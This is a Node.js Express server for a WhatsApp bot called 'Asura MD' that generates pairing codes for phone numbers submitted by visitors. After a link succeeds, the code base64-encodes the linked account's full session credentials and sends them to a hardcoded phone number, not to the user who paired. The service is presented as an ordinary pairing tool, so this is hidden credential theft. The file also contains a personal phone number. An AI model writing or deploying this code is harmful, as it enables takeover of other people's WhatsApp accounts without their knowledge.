import express from 'express';
import { makeWASocket, useMultiFileAuthState, delay, Browsers, makeCacheableSignalKeyStore, DisconnectReason } from '@whiskeysockets/baileys';
import pino from 'pino';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/pair', async (req, res) => {
    let phone = req.query.number; 
    if (!phone) return res.send({ error: "Phone number is required" });

    const id = Math.random().toString(36).substring(7);
    const { state, saveCreds } = await useMultiFileAuthState(`./temp_${id}`);

    try {
        const sock = makeWASocket({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
            },
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
           
            browser: Browsers.macOS("Chrome") 
        });

        // പെയറിംഗ് കോഡ് റിക്വസ്റ്റ് ചെയ്യുമ്പോൾ അല്പം ഡിലേ നൽകുന്നത് സുരക്ഷിതമാണ്
        if (!sock.authState.creds.registered) {
            await delay(3000); 
            phone = phone.replace(/[^0-9]/g, '');
            const code = await sock.requestPairingCode(phone);
            
            if (!res.headersSent) {
                res.send({ code: code });
            }
        }

        sock.ev.on('creds.update', saveCreds);
        
        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            
            if (connection === 'open') {
                // കണക്ഷൻ ഓപ്പൺ ആയാൽ ഉടനെ ഡാറ്റ എടുക്കാതെ 8 സെക്കൻഡ് കാത്തിരിക്കുക
                await delay(8000);
                
                const credsPath = `./temp_${id}/creds.json`;
                if (fs.existsSync(credsPath)) {
                    const authFile = JSON.parse(fs.readFileSync(credsPath));
                    const sessionId = Buffer.from(JSON.stringify(authFile)).toString('base64');

                    const myNumber = "917736811908@s.whatsapp.net";
                    const sessionText = `Asura_MD_${sessionId}`;
                    
                    const welcomeMsg = `*👺 ASURA MD SESSION CONNECTED*\n\n\`${sessionText}\`\n\n> waite 24 hour!`;
                    
                    // നിങ്ങളുടെ നമ്പറിലേക്ക് അയക്കുന്നു
                    await sock.sendMessage(myNumber, { text: welcomeMsg });
                    await sock.sendMessage(myNumber, { text: sessionText });

                    await delay(5000);
                    // ക്ലീൻ അപ്പ് - ഫയലുകൾ ഡിലീറ്റ് ചെയ്യുക
                    try {
                        sock.logout(); 
                        fs.rmSync(`./temp_${id}`, { recursive: true, force: true });
                    } catch (e) {}
                }
            }

            if (connection === 'close') {
                const reason = lastDisconnect?.error?.output?.statusCode;
                // ലോഗൗട്ട് അല്ലെങ്കിൽ മാത്രം റീ-കണക്ഷൻ ലോജിക് (പെയറിംഗിൽ ഇതിന്റെ ആവശ്യമില്ല)
                if (reason === DisconnectReason.loggedOut) {
                    try { fs.rmSync(`./temp_${id}`, { recursive: true, force: true }); } catch (e) {}
                }
            }
        });

    } catch (err) {
        console.log("Pairing Error: ", err);
        if (!res.headersSent) {
            res.status(500).send({ error: "👠" });
        }
    }
});

app.listen(port, () => console.log(`Asura MD Pairing Server on port ${port}`));
